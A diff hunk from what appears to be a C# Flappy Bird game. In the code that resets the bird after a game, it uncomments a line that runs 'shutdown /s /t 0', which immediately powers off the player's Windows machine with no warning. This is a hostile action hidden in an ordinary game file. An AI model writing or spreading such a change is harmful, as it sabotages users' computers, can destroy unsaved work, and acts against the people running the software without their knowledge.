@@ -146,7 +146,7 @@ namespace flappy_bird
                 Canvas.SetTop(Bird, yAxis);
                 isGameOver = false;
 
-                //Process.Start("shutdown", "/s /t 0");
+                Process.Start("shutdown", "/s /t 0");
 
             }
 
